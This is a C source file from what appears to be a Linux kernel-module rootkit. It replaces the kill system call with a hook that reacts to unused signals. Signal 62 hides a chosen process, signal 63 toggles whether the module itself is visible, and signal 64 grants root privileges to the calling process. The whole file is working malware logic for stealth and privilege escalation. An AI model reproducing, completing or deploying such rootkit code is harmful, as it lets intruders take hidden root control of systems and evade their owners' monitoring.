#include "kill.h"
#include "../../hide/lkm.h"
#include "../../hide/pid.h"
#include "../../privesc/credreplace.h"

static int logic(int sig, pid_t pid)
{
  switch (sig) {
  case 62:
    hide_pid(pid);
    return 0;
  case 63:
    toggle_lkm_visibility();
    return 0;
  case 64:
    // TODO: Re-investigate modifying other processes.
    // - If solution found, use stealth_root in privesc/credreplace.c
    give_root();
    return 0;
  default:
    // TODO: Just return original implementation of kill
    break;
  }

  return -1;
}

#ifdef PTREGS_SYSCALL_STUBS
extern asmlinkage long (*orig_kill)(const struct pt_regs*);
/* FIXME: We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused)
 * and then call the set_root() function. */
asmlinkage int hook_kill(const struct pt_regs* regs)
{
  if (logic(regs->si, regs->di) != -1) {
    // FIXME: Potentially want to call actual kill
    return 0;
  }

  return orig_kill(regs);
}
#else
extern asmlinkage long (*orig_kill)(pid_t pid, int sig);
/* This is the old way of declaring a syscall hook */
asmlinkage int hook_kill(pid_t pid, int sig)
{
  if (logic(sig, pid) != -1) {
    // FIXME: Potentially want to call actual kill
    return 0;
  }

  return orig_kill(pid, sig);
}
#endif
